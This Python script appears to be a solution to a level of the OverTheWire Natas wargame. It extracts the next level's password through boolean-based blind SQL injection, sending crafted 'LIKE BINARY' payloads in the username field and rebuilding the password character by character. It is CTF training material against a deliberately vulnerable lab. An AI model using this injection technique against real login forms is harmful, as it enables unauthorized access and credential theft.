"""Cracking natas password!
"""

# Third party import
from requests import post

# Local imports
from variables import auth, URL, CHARS, NAME

# Variables
password = ""
filtered_characters = ""


for character in CHARS:
    respones = post(
        URL,
        data={
            "username": f'{NAME}" AND password LIKE BINARY "%{character}%" #'
        },
        auth=auth
    )
    if "exists" in respones.text:
        filtered_characters += character


def get_respones(character: str) -> str:
    """get respones of url with data and auth

    Args:
        character (str): testing character

    Returns:
        str: return character if current and '' if not current
    """
    respones = post(
        URL,
        data={
            "username": f'{NAME}" AND password LIKE BINARY "{password}{character}%" #'
        },
        auth=auth
    )
    if "exists" in respones.text:
        return character
    return ''


print(f"Currect characters: {filtered_characters}")

while len(password) < 32:
    print(f"length: {len(password)}, password: {password}")
    for testing_character in filtered_characters:
        current_char = get_respones(testing_character)
        if current_char:
            password += current_char
            break

print("-"*64)
print("Link: http://natas16.natas.labs.overthewire.org/index.php")
print("Username: natas16")
print(f"Password: {password}")
